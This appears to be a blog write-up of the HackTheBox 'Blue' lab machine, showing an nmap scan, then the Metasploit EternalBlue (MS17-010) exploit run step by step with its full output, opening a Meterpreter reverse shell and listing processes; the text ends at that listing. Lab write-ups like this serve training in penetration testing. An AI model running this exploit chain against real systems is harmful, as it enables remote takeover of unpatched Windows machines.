<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="HTB Blue - writeup" /><meta name="author" content="Farrim Wildaxe" /><meta property="og:locale" content="en" /><meta name="description" content="Blue machine is probably one of the easiest Windows machines on HackTheBox. Potential vulnerability is already hidden in machine name ;). But first thing first, let’s do an enumeration with nmap: ```shell $ sudo nmap -sS -sV -sC -Pn -O -A -p1-20000 -T5 10.10.10.40 [sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-06 09:12 EST Warning: 10.10.10.40 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.10.40 Host is up (0.11s latency). Not shown: 19997 closed tcp ports (reset) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 SP1 (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 8.1 (96%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows" /><meta property="og:description" content="Blue machine is probably one of the easiest Windows machines on HackTheBox. Potential vulnerability is already hidden in machine name ;). But first thing first, let’s do an enumeration with nmap: ```shell $ sudo nmap -sS -sV -sC -Pn -O -A -p1-20000 -T5 10.10.10.40 [sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-06 09:12 EST Warning: 10.10.10.40 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.10.40 Host is up (0.11s latency). Not shown: 19997 closed tcp ports (reset) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 SP1 (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 8.1 (96%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows" /><link rel="canonical" href="https://farrim.re/posts/htb-blue-writeup/" /><meta property="og:url" content="https://farrim.re/posts/htb-blue-writeup/" /><meta property="og:site_name" content="Farrim’s blog" /><meta property="og:image" content="https://farrim.re/assets/img/htb/blue/blue.png" /><meta property="og:image:height" content="516" /><meta property="og:image:width" content="700" /><meta property="og:image:alt" content="image alternative text" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-06-30T21:13:33+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://farrim.re/assets/img/htb/blue/blue.png" /><meta name="twitter:image:alt" content="image alternative text" /><meta property="twitter:title" content="HTB Blue - writeup" /><meta name="twitter:site" content="@farrimwildaxe" /><meta name="twitter:creator" content="@farrimwildaxe" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Farrim Wildaxe","url":"https://farrim.re"},"dateModified":"2023-03-12T23:52:34+00:00","datePublished":"2022-06-30T21:13:33+00:00","description":"Blue machine is probably one of the easiest Windows machines on HackTheBox. Potential vulnerability is already hidden in machine name ;). But first thing first, let’s do an enumeration with nmap: ```shell $ sudo nmap -sS -sV -sC -Pn -O -A -p1-20000 -T5 10.10.10.40 [sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-06 09:12 EST Warning: 10.10.10.40 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.10.40 Host is up (0.11s latency). Not shown: 19997 closed tcp ports (reset) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 SP1 (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 8.1 (96%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows","headline":"HTB Blue - writeup","image":{"width":700,"height":516,"alt":"image alternative text","url":"https://farrim.re/assets/img/htb/blue/blue.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://farrim.re/posts/htb-blue-writeup/"},"url":"https://farrim.re/posts/htb-blue-writeup/"}</script><title>HTB Blue - writeup | Farrim's blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Farrim's blog"><meta name="application-name" content="Farrim's blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://farrim.re/assets/farrimwildaxe.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Farrim's blog</a></div><div class="site-subtitle font-italic"></div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/writeups/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>WRITEUPS</span> </a><li class="nav-item"> <a href="/research/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>RESEARCH</span> </a><li class="nav-item"> <a href="/disclaimer/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>DISCLAIMER</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/farrimwildaxe" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/farrimwildaxe" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['FarrimWildaxe','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HTB Blue - writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>HTB Blue - writeup</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1656623613" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jun 30, 2022 </em> </span> <span> Updated <em class="" data-ts="1678665154" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 13, 2023 </em> </span><div class="mt-3 mb-3"> <a href="/assets/img/htb/blue/blue.png" class="popup img-link preview-img shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1200 630'%3E%3C/svg%3E" data-src="/assets/img/htb/blue/blue.png" alt="image alternative text" width="1200" height="630" class="lazyload" data-proofer-ignore></a><figcaption class="text-center pt-2 pb-2">image alternative text</figcaption></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://farrim.re">Farrim Wildaxe</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1733 words"> <em>9 min</em> read</span></div></div></div><div class="post-content"><p>Blue machine is probably one of the easiest Windows machines on HackTheBox. Potential vulnerability is already hidden in machine name ;). But first thing first, let’s do an enumeration with nmap:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-Pn</span> <span class="nt">-O</span> <span class="nt">-A</span> <span class="nt">-p1-20000</span> <span class="nt">-T5</span> 10.10.10.40
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-06 09:12 EST
Warning: 10.10.10.40 giving up on port because retransmission cap hit <span class="o">(</span>2<span class="o">)</span><span class="nb">.</span>
Nmap scan report <span class="k">for </span>10.10.10.40
Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 19997 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 <span class="o">(</span>97%<span class="o">)</span>, Microsoft Windows Server 2008 R2 SP1 <span class="o">(</span>96%<span class="o">)</span>, Microsoft Windows Server 2008 SP1 <span class="o">(</span>96%<span class="o">)</span>, Microsoft Windows Server 2008 SP2 <span class="o">(</span>96%<span class="o">)</span>, Microsoft Windows 7 <span class="o">(</span>96%<span class="o">)</span>, Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 <span class="o">(</span>96%<span class="o">)</span>, Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 <span class="o">(</span>96%<span class="o">)</span>, Microsoft Windows 7 SP1 <span class="o">(</span>96%<span class="o">)</span>, Microsoft Windows 7 Ultimate <span class="o">(</span>96%<span class="o">)</span>, Microsoft Windows 8.1 <span class="o">(</span>96%<span class="o">)</span>
No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
Network Distance: 2 hops
Service Info: Host: HARIS-PC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   <span class="nb">date</span>: 2022-03-06T14:20:12
|_  start_date: 2022-03-06T14:17:13
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 <span class="o">(</span>Windows 7 Professional 6.1<span class="o">)</span>
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC<span class="se">\x</span>00
|   Workgroup: WORKGROUP<span class="se">\x</span>00
|_  System <span class="nb">time</span>: 2022-03-06T14:20:13+00:00
|_clock-skew: mean: 5m32s, deviation: 1s, median: 5m31s

TRACEROUTE <span class="o">(</span>using port 21/tcp<span class="o">)</span>
HOP RTT      ADDRESS
1   94.69 ms 10.10.16.1
2   46.14 ms 10.10.10.40

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>153.82 seconds
</pre></table></code></div></div><p>When nmap finishes port scanning we see that Blue is running Windows 7 SP1 system. As we could find from the machine name there is a possibility, that it’s vulnerable to NSA EternalBlue exploit, let’s start metasploit and check it:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nv">$ </span>msfconsole <span class="nt">-q</span>
msf6 <span class="o">&gt;</span> search eternal

Matching Modules
<span class="o">================</span>

   <span class="c">#  Name                                      Disclosure Date  Rank     Check  Description</span>
   -  <span class="nt">----</span>                                      <span class="nt">---------------</span>  <span class="nt">----</span>     <span class="nt">-----</span>  <span class="nt">-----------</span>
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
</pre></table></code></div></div><p>In metasploit we have <code class="language-plaintext highlighter-rouge">exploit/windows/smb/ms17_010_eternalblue</code> exploit ready, so let’s use it:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>msf6 <span class="o">&gt;</span> use 0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
</pre></table></code></div></div><p>and check what options are available:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.17.132   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
</pre></table></code></div></div><p>Above options are default ones, so we need to change it:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost tun0
lhost =&gt; tun0
msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 10.10.10.40
rhosts =&gt; 10.10.10.40
</pre></table></code></div></div><p>We will use <code class="language-plaintext highlighter-rouge">tun0</code> interface for <code class="language-plaintext highlighter-rouge">lhost</code>, so metasploit will automatically pick proper IP address for us, also we need to set a target IP address (<code class="language-plaintext highlighter-rouge">rhosts</code> variable), and we’re ready to go.</p><p>Lets run the exploit:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run

[-] Handler failed to bind to 10.10.16.3:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] 10.10.10.40:445 - Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run

[*] Started reverse TCP handler on 10.10.16.3:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.16.3:4444 -&gt; 10.10.10.40:49158 ) at 2022-03-06 11:09:44 -0500
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
</pre></table></code></div></div><p>Bingo! We’ve got the meterpreter session! Let’s check what is there:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre>meterpreter &gt; ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System             x64   0
 132   644   WmiPrvSE.exe
 272   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 356   348   csrss.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 408   348   wininit.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 428   400   csrss.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 484   400   winlogon.exe       x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 516   408   services.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 532   408   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 544   408   lsm.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 588   516   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 644   516   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 720   516   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 796   484   LogonUI.exe        x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 804   516   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 872   516   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 912   516   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 948   516   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 1072  516   spoolsv.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1104  516   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 1200  516   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 1364  516   VGAuthService.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
 1404  516   vmtoolsd.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 1704  516   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 1908  516   dllhost.exe        x64   0        NT AUTHORITY\SYSTEM
 1992  516   msdtc.exe          x64   0        NT AUTHORITY\NETWORK SERVICE
 2644  516   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 2716  516   SearchIndexer.exe  x64   0        NT AUTHORITY\SYSTEM
